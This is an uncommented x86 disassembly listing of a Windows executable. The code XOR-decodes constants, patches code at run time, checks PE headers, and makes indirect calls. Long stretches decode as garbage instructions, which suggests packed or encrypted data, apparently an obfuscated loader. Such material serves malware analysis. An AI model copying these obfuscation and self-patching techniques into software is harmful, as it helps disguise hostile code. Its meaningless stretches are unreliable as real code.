  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x4305d6,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42eeb0,0x4305d2
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee90,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x430522,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x4305ce,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x430532,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x430536,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xba1029a2,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a226
  40a236:	iret   
  40a237:	pop    esi
  40a238:	fs popa 
  40a23a:	push   cs
  40a23b:	neg    BYTE PTR [ebx+edx*4]
  40a23e:	sbb    esp,esp
  40a240:	aaa    
  40a241:	(bad)  
  40a242:	(bad)  
  40a243:	mov    eax,eax
  40a245:	mov    bh,0x41
  40a247:	(bad)  
  40a248:	push   ss
  40a249:	add    eax,0x345d6b60
  40a24e:	cmp    ebp,DWORD PTR [esp+eiz*8-0x55249479]
  40a255:	xor    esi,DWORD PTR [edx+ecx*1-0x34b3f8d9]
  40a25c:	and    bl,BYTE PTR [ecx]
  40a25e:	cdq    
  40a25f:	xchg   ebp,eax
  40a260:	cmp    al,0x3
  40a262:	mov    eax,0x129401ab
  40a267:	pusha  
  40a268:	dec    esi
  40a269:	mov    ecx,esp
  40a26b:	imul   ebp,DWORD PTR [edi+0x5e],0x952b4af7
  40a272:	xor    al,cl
  40a274:	ficomp WORD PTR [esi]
  40a276:	mov    ecx,eax
  40a278:	adc    eax,0xe72923b3
  40a27d:	adc    edi,esi
  40a27f:	sub    BYTE PTR [eax-0x595281ad],bh
  40a285:	and    eax,0xec81328
  40a28a:	inc    esp
  40a28b:	test   DWORD PTR [edi],eax
  40a28d:	das    
  40a28e:	arpl   WORD PTR [ecx],bx
  40a290:	pusha  
  40a291:	or     DWORD PTR [edi],esi
  40a293:	xor    eax,0xcb505072
  40a298:	out    0x55,al
  40a29a:	out    0x8d,al
  40a29c:	rcr    ch,0x1e
  40a29f:	and    BYTE PTR [esi],ch
  40a2a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2a2:	or     al,0x5a
  40a2a4:	(bad)  
  40a2a5:	rcl    DWORD PTR [ebp+0x2c],cl
  40a2a8:	aad    0xd8
  40a2aa:	push   es
  40a2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ac:	xchg   edi,eax
  40a2ad:	aas    
  40a2ae:	xor    eax,0xb1d2d3b
  40a2b3:	inc    edx
  40a2b4:	ins    BYTE PTR es:[edi],dx
  40a2b5:	rol    BYTE PTR [esp+esi*8],cl
  40a2b8:	jl     0x40a2fc
  40a2ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2bb:	out    dx,eax
  40a2bc:	aas    
  40a2bd:	in     al,dx
  40a2be:	inc    esp
  40a2bf:	call   FWORD PTR [edi+eiz*1+0x3d19ee61]
  40a2c6:	mov    ebx,0x65b02f71
  40a2cb:	push   esi
  40a2cc:	pop    ds
  40a2cd:	ds pusha 
  40a2cf:	mov    ebx,0xd691b996
  40a2d4:	push   0x61a63831
  40a2d9:	outs   dx,BYTE PTR ds:[esi]
  40a2da:	pushf  
  40a2db:	sub    edx,esi
  40a2dd:	cmp    ecx,edi
  40a2df:	popa   
  40a2e0:	loopne 0x40a34e
  40a2e2:	sub    eax,0xedccd23d
  40a2e7:	mov    esi,0x4d839959
  40a2ec:	(bad)  
  40a2ed:	mov    WORD PTR [ecx-0x3c],es
  40a2f0:	fdiv   st,st(4)
  40a2f2:	ss pop edi
  40a2f4:	add    DWORD PTR [ebx+ecx*2],ebp
  40a2f7:	ins    BYTE PTR es:[edi],dx
  40a2f8:	mov    bl,0xd8
  40a2fa:	pusha  
  40a2fb:	mov    ebp,0x1789d529
  40a300:	jl     0x40a2ad
  40a302:	rcl    BYTE PTR [esi-0x3],cl
  40a305:	(bad)  
  40a306:	cmp    al,0x97
  40a308:	adc    eax,0x333e46ee
  40a30d:	pop    ecx
  40a30e:	aaa    
  40a30f:	mov    dh,0x4e
  40a311:	test   al,0x31
  40a313:	stos   BYTE PTR es:[edi],al
  40a314:	mov    BYTE PTR [eax-0x3b],bl
  40a317:	stos   DWORD PTR es:[edi],eax
  40a318:	(bad)  
  40a319:	adc    eax,0x2572323c
  40a31e:	imul   BYTE PTR [eax]
  40a320:	xor    ecx,edi
  40a322:	call   0x2cd55d5d
  40a327:	xchg   edx,eax
  40a328:	xchg   ecx,eax
  40a329:	jecxz  0x40a33c
  40a32b:	xor    ebp,DWORD PTR [eax-0x75de60de]
  40a331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a332:	ret    
  40a333:	out    0xbf,eax
  40a335:	xor    bh,BYTE PTR [ecx+ebp*4-0xb3883af]
  40a33c:	clc    
  40a33d:	pop    edi
  40a33e:	xchg   ecx,eax
  40a33f:	cdq    
  40a340:	pushf  
  40a341:	iret   
  40a342:	mov    dx,0xdd18
  40a346:	add    eax,0xaa6a567c
  40a34b:	xor    edx,ebp
  40a34d:	xor    eax,0xaed82394
  40a352:	mov    WORD PTR [esi],?
  40a354:	push   esp
  40a355:	in     eax,0x85
  40a357:	dec    eax
  40a358:	jle    0x40a30e
  40a35a:	jb     0x40a3bb
  40a35c:	fdivrp st(0),st
  40a35e:	add    eax,0xe3f18469
  40a363:	xchg   esi,eax
  40a364:	fmulp  st(1),st
  40a366:	mov    esp,0xec42985
  40a36b:	add    ecx,DWORD PTR [edi+0x1795f3dc]
  40a371:	push   eax
  40a372:	outs   dx,BYTE PTR ds:[esi]
  40a373:	xor    cl,BYTE PTR [esi+0x43399fd2]
  40a379:	cld    
  40a37a:	test   al,0xe1
  40a37c:	push   ebp
  40a37d:	adc    DWORD PTR [ebx+eiz*8],ebx
  40a380:	loope  0x40a32b
  40a382:	jp     0x40a342
  40a384:	add    ecx,DWORD PTR [eax-0x1d3e3b62]
  40a38a:	bound  esi,QWORD PTR [esi]
  40a38c:	jle    0x40a38b
  40a38e:	or     ebx,edx
  40a390:	icebp  
  40a391:	mov    dh,0xf2
  40a393:	pop    ss
  40a394:	xchg   edx,eax
  40a395:	jns    0x40a397
  40a397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a398:	neg    BYTE PTR [esi+0x184058a]
  40a39e:	out    dx,eax
  40a39f:	dec    ebx
  40a3a0:	jmp    0xb75a:0x8dff7512
  40a3a7:	pop    eax
  40a3a8:	jb     0x40a353
  40a3aa:	loope  0x40a3e7
  40a3ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ad:	lds    edi,FWORD PTR [ebx+0x76364c17]
  40a3b3:	je     0x40a3cd
  40a3b5:	inc    eax
  40a3b6:	mov    cl,0x32
  40a3b8:	imul   DWORD PTR ds:[ecx+0x78e7ba95]
  40a3bf:	sub    BYTE PTR [edx+0x218c4997],ah
  40a3c5:	nop
  40a3c6:	mov    ds:0x6741f550,eax
  40a3cb:	or     esp,DWORD PTR [ecx-0x3fd71c89]
  40a3d1:	dec    ebp
  40a3d2:	mov    BYTE PTR [edx-0x4bd87228],al
  40a3d8:	xor    BYTE PTR [ecx-0x4b],0x70
  40a3dc:	pop    ss
  40a3dd:	push   0xfffffff0
  40a3df:	js     0x40a441
  40a3e1:	repnz ss stos BYTE PTR es:[edi],al
  40a3e4:	enter  0xf104,0xdf
  40a3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e9:	xchg   esp,eax
  40a3ea:	push   ebx
  40a3eb:	pop    edi
  40a3ec:	xor    al,0x42
  40a3ee:	jnp    0x40a3bb
  40a3f0:	dec    esp
  40a3f1:	out    dx,eax
  40a3f2:	cmp    ebx,ebp
  40a3f4:	xchg   ebx,eax
  40a3f5:	xchg   ecx,eax
  40a3f6:	out    dx,eax
  40a3f7:	mov    bl,BYTE PTR [edi]
  40a3f9:	fldcw  WORD PTR [esi+0xb67ba81]
  40a3ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a400:	shl    esi,0x34
  40a403:	pusha  
  40a404:	test   ebx,0x776f952d
  40a40a:	lds    eax,FWORD PTR [ebx]
  40a40c:	push   edi
  40a40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40e:	scas   al,BYTE PTR es:[edi]
  40a40f:	sbb    cl,dl
  40a411:	lods   al,BYTE PTR ds:[esi]
  40a412:	inc    ebx
  40a413:	dec    ebx
  40a414:	loopne 0x40a48b
  40a416:	add    ah,al
  40a418:	ss jle 0x40a499
  40a41b:	inc    esp
  40a41c:	jmp    0x513f:0x53e71439
  40a423:	xchg   ebx,eax
  40a424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a425:	mov    ebp,0xae8debf
  40a42a:	mov    dl,0xbc
  40a42c:	pop    ds
  40a42d:	aaa    
  40a42e:	jg     0x40a3b1
  40a430:	invd   
  40a432:	mov    ds:0x21289925,al
  40a437:	cmp    ah,ah
  40a439:	stc    
  40a43a:	add    BYTE PTR [edi],0x61
  40a43d:	push   di
  40a43f:	xor    al,ah
  40a441:	dec    esi
  40a442:	xor    cl,BYTE PTR [edx+0x720f8c35]
  40a448:	or     al,0xa1
  40a44a:	jo     0x40a45f
  40a44c:	add    eax,0x4b4f5485
  40a451:	xchg   ebx,eax
  40a452:	sbb    BYTE PTR [ebx-0x6f],ch
  40a455:	mov    edi,0x135f018
  40a45a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a45b:	xor    ebp,DWORD PTR [ecx+0x703d15c7]
  40a461:	jg     0x40a3e7
  40a463:	or     al,0xda
  40a465:	aaa    
  40a466:	fild   WORD PTR [ebx]
  40a468:	arpl   WORD PTR [edi+0x69],si
  40a46b:	test   DWORD PTR [edi+eax*1],ebp
  40a46e:	in     al,dx
  40a46f:	xor    al,0x4c
  40a471:	ins    DWORD PTR es:[edi],dx
  40a472:	mov    DWORD PTR ds:0x1ea12006,ebp
  40a478:	mov    bh,0x20
  40a47a:	xchg   esp,eax
  40a47b:	cdq    
  40a47c:	xchg   edx,eax
  40a47d:	scas   eax,DWORD PTR es:[edi]
  40a47e:	or     al,dh
  40a480:	push   es
  40a481:	mov    ebp,DWORD PTR [edx]
  40a483:	fimul  DWORD PTR [edi]
  40a485:	add    eax,0xcaaf4abc
  40a48a:	bound  ebp,QWORD PTR [edx+0x9514570]
  40a490:	xor    al,0x8f
  40a492:	(bad)  
  40a493:	sbb    DWORD PTR [ebp+0x8458b3f],edi
  40a499:	mov    DWORD PTR ds:0x4305c2,0x17
  40a4a3:	cmp    DWORD PTR ds:0x4305c2,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x4305c2,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eb64
  40a4c6:	mov    ecx,DWORD PTR ds:0x4305c2
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x4305c2,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0xc22fa360
  40a537:	push   ebp
  40a538:	test   eax,0x7e7ee8b4
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a524
  40a542:	xor    DWORD PTR [esp+edi*8-0x3b5ad08],eax
  40a549:	push   cs
  40a54a:	rcr    DWORD PTR [esi+0x46],1
  40a54d:	mov    ds:0x78a6d329,al
  40a552:	int    0x84
  40a554:	pop    ebx
  40a555:	lods   al,BYTE PTR ds:[esi]
  40a556:	data16 fsub DWORD PTR [eax+0xa]
  40a55a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a55b:	lahf   
  40a55c:	fsub   st,st(7)
  40a55e:	rcl    BYTE PTR [esi-0x60],cl
  40a561:	adc    eax,0xab6fd06e
  40a566:	xor    al,0x57
  40a568:	loopne 0x40a52f
  40a56a:	push   ecx
  40a56b:	stos   DWORD PTR es:[edi],eax
  40a56c:	(bad)  
  40a56e:	retf   
  40a56f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a570:	xor    cl,0x3
  40a573:	pop    esi
  40a574:	shl    BYTE PTR [edi],0xd3
  40a577:	and    ebp,DWORD PTR [ecx-0x3]
  40a57a:	mov    DWORD PTR [ebx-0x41],ebx
  40a57d:	cwde   
  40a57e:	pop    gs
  40a580:	out    dx,eax
  40a581:	std    
  40a582:	or     eax,0x987fd4a3
  40a587:	mov    DWORD PTR [edx],ebx
  40a589:	and    edi,esp
  40a58b:	mov    bl,0xc9
  40a58d:	jno    0x40a5bb
  40a58f:	xor    al,dh
  40a591:	call   0x7303:0xaa22a1ac
  40a598:	dec    ebp
  40a599:	test   al,ah
  40a59b:	mov    DWORD PTR [edx],ebp
  40a59d:	dec    esi
  40a59e:	outs   dx,BYTE PTR ds:[esi]
  40a59f:	inc    edx
  40a5a0:	sbb    ebx,eax
  40a5a2:	(bad)  
  40a5a4:	gs sbb edx,esi
  40a5a7:	adc    eax,0x1fcbe9dd
  40a5ac:	(bad)  
  40a5ad:	jg     0x40a567
  40a5af:	cli    
  40a5b0:	sbb    ecx,DWORD PTR [edx-0x610a0896]
  40a5b6:	mov    esp,0x10723109
  40a5bb:	pop    esi
  40a5bc:	cld    
  40a5bd:	popf   
  40a5be:	push   esp
  40a5bf:	lahf   
  40a5c0:	arpl   ax,sp
  40a5c2:	shl    BYTE PTR [edx],0x42
  40a5c5:	sahf   
  40a5c6:	test   DWORD PTR [ebx],0xa2bcee57
  40a5cc:	push   ecx
  40a5cd:	jmp    0x40a5c2
  40a5cf:	push   cs
  40a5d0:	bound  edi,QWORD PTR [ebp+0x62]
  40a5d3:	fisub  DWORD PTR ds:0x5f90ae9b
  40a5d9:	xchg   edx,eax
  40a5da:	pusha  
  40a5db:	icebp  
  40a5dc:	mov    eax,ebx
  40a5de:	jbe    0x40a5d1
  40a5e0:	fdivr  st(7),st
  40a5e2:	cmp    BYTE PTR [edx],ch
  40a5e4:	in     al,dx
  40a5e5:	pop    ss
  40a5e6:	sbb    ecx,ebx
  40a5e8:	push   ss
  40a5e9:	ret    
  40a5ea:	adc    eax,0xdd06dbd0
  40a5ef:	add    eax,0xd106daaf
  40a5f4:	xor    edi,esi
  40a5f6:	inc    edi
  40a5f7:	mov    ds:0x3e9946ae,al
  40a5fc:	ror    BYTE PTR [esi-0x99a63de],1
  40a602:	add    DWORD PTR [ebx+0x5c],esp
  40a605:	inc    esp
  40a606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a607:	inc    ebx
  40a608:	jge    0x40a5bd
  40a60a:	es icebp 
  40a60c:	bound  edx,QWORD PTR [ecx+0x68]
  40a60f:	pop    ebp
  40a610:	inc    edi
  40a611:	add    DWORD PTR [eax-0x6c],0x61
  40a615:	ds and eax,0x587d7185
  40a61b:	dec    edi
  40a61c:	or     BYTE PTR [eax-0x12],dl
  40a61f:	bound  esp,QWORD PTR [eax]
  40a621:	pop    edi
  40a622:	mov    al,0x59
  40a624:	sbb    bl,0x63
  40a627:	xor    esi,DWORD PTR [edi-0x14]
  40a62a:	aas    
  40a62b:	test   eax,0x2b57ff84
  40a630:	outs   dx,DWORD PTR ds:[esi]
  40a631:	adc    bh,bh
  40a633:	enter  0x5d0c,0xa8
  40a637:	cdq    
  40a638:	jle    0x40a618
  40a63a:	retf   
  40a63b:	sub    DWORD PTR [edx],ecx
  40a63d:	and    BYTE PTR [edx+eiz*1],al
  40a640:	push   ss
  40a641:	into   
  40a642:	cmc    
  40a643:	pop    esi
  40a644:	mov    al,0x99
  40a646:	or     BYTE PTR [ebx+0x5d321ab],0xf1
  40a64d:	or     ecx,ebp
  40a64f:	pop    ss
  40a650:	shl    DWORD PTR [edx],cl
  40a652:	ds push ds
  40a654:	loop   0x40a6bf
  40a656:	xchg   ebp,eax
  40a657:	in     eax,dx
  40a658:	addr16 pop es
  40a65a:	sub    DWORD PTR [esi+ebx*1],edx
  40a65d:	inc    ebx
  40a65e:	scas   eax,DWORD PTR es:[edi]
  40a65f:	repnz sbb eax,0xbed40854
  40a665:	fst    DWORD PTR [esi+0x50]
  40a668:	hlt    
  40a669:	test   eax,0x3518c1a
  40a66e:	cmp    eax,0xc0c72f92
  40a673:	jecxz  0x40a605
  40a675:	and    eax,0xee63427f
  40a67a:	push   esi
  40a67b:	mov    bh,ah
  40a67d:	aaa    
  40a67e:	shl    BYTE PTR [ecx+0x65a2a717],cl
  40a684:	cld    
  40a685:	mov    ecx,0x91d10a3a
  40a68a:	loopne 0x40a673
  40a68c:	xor    esp,edi
  40a68e:	lahf   
  40a68f:	enter  0xbefe,0xb3
  40a693:	(bad)  
  40a695:	or     edi,DWORD PTR [edi+0x61]
  40a698:	adc    edi,esi
  40a69a:	sub    edi,ebp
  40a69c:	mov    edx,0xeb574ae1
  40a6a1:	aaa    
  40a6a2:	ins    DWORD PTR es:[edi],dx
  40a6a3:	imul   edi,eax,0x72
  40a6a6:	popa   
  40a6a7:	outs   dx,BYTE PTR ds:[esi]
  40a6a8:	mov    ch,0xf9
  40a6aa:	inc    esp
  40a6ab:	scas   eax,DWORD PTR es:[edi]
  40a6ac:	stc    
  40a6ad:	sbb    BYTE PTR [ecx-0x461a1dd1],bl
  40a6b3:	cmp    dh,al
  40a6b5:	adc    edi,DWORD PTR ds:0x56a7aaff
  40a6bb:	in     al,dx
  40a6bc:	and    al,BYTE PTR [esi]
  40a6be:	jb     0x40a6ed
  40a6c0:	adc    esp,eax
  40a6c2:	cmp    al,ch
  40a6c4:	lods   eax,DWORD PTR ds:[esi]
  40a6c5:	fwait
  40a6c6:	test   al,0x81
  40a6c8:	pop    esp
  40a6c9:	pop    ebp
  40a6ca:	mov    ss,esi
  40a6cc:	and    cl,BYTE PTR [esi-0xb279eab]
  40a6d2:	mov    bh,BYTE PTR [eax+edx*2+0xf]
  40a6d6:	jne    0x40a676
  40a6d8:	mov    ah,0x7d
  40a6da:	dec    eax
  40a6db:	js     0x40a721
  40a6dd:	sub    edx,DWORD PTR [edi-0x6f]
  40a6e0:	dec    ebx
  40a6e1:	pop    ecx
  40a6e2:	aam    0xd6
  40a6e4:	jg     0x40a68b
  40a6e6:	jl     0x40a746
  40a6e8:	sub    BYTE PTR [esi+0x3bac646c],ah
  40a6ee:	fwait
  40a6ef:	xchg   ebx,eax
  40a6f0:	or     DWORD PTR [ecx-0x54],esp
  40a6f3:	ror    BYTE PTR [ebx],1
  40a6f5:	jecxz  0x40a740
  40a6f7:	and    esi,esi
  40a6f9:	xor    BYTE PTR [esi-0x56],bh
  40a6fc:	into   
  40a6fd:	cmp    DWORD PTR [eax],0xc3f96cb8
  40a703:	jb     0x40a751
  40a705:	push   ds
  40a706:	sub    DWORD PTR [edx-0x7c],0xffffff87
  40a70a:	inc    ebp
  40a70b:	int    0x7f
  40a70d:	(bad)  
  40a70e:	std    
  40a70f:	fisttp DWORD PTR [esi+0x573ef984]
  40a715:	popf   
  40a716:	fld    st(1)
  40a718:	push   ebx
  40a719:	dec    ebp
  40a71a:	ret    
  40a71b:	call   0x1422:0xbafe5de6
  40a722:	daa    
  40a723:	mov    edi,0xc2d47505
  40a728:	das    
  40a729:	xlat   BYTE PTR ds:[ebx]
  40a72a:	jns    0x40a6b2
  40a72c:	(bad)  
  40a72e:	inc    edi
  40a72f:	test   eax,0x7b5f6ded
  40a735:	scas   eax,DWORD PTR es:[edi]
  40a736:	les    esi,FWORD PTR ds:0xf2556c19
  40a73c:	mov    esp,0x5fd12759
  40a741:	imul   esi,DWORD PTR [edi],0x3d
  40a744:	lea    ebp,[esi+0x7]
  40a747:	jecxz  0x40a6f2
  40a749:	in     al,dx
  40a74a:	inc    esp
  40a74b:	popw   ss
  40a74d:	pop    es
  40a74e:	ret    
  40a74f:	retf   
  40a750:	out    dx,eax
  40a751:	mov    dl,0x93
  40a753:	imul   edx,esp,0xc3c01235
  40a759:	and    bl,dl
  40a75b:	and    al,BYTE PTR [eax-0x3f83d7ed]
  40a761:	cdq    
  40a762:	out    dx,al
  40a763:	and    ah,BYTE PTR es:[edi+0x16]
  40a767:	jnp    0x40a6eb
  40a769:	dec    BYTE PTR [ebx+edx*8-0x3a50a48e]
  40a770:	leave  
  40a771:	mov    dl,0x9f
  40a773:	mov    dl,0x51
  40a775:	pop    edi
  40a776:	les    ecx,FWORD PTR [edx]
  40a778:	lds    esp,FWORD PTR [edi]
  40a77a:	inc    ebp
  40a77b:	iret   
  40a77c:	loop   0x40a713
  40a77e:	mov    eax,ds:0xbfd52670
  40a783:	popa   
  40a784:	pop    esi
  40a785:	sub    BYTE PTR [edx+0x61329ae],cl
  40a78b:	ret    
  40a78c:	mov    ebp,0x3a40575b
  40a791:	mov    ch,0x52
  40a793:	xchg   esp,eax
  40a794:	test   eax,0x1e2dc06
  40a799:	or     eax,0x1f980fd6
  40a79e:	dec    esp
  40a79f:	jne    0x40a766
  40a7a1:	inc    ebx
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43051e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43051e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43051e,eax
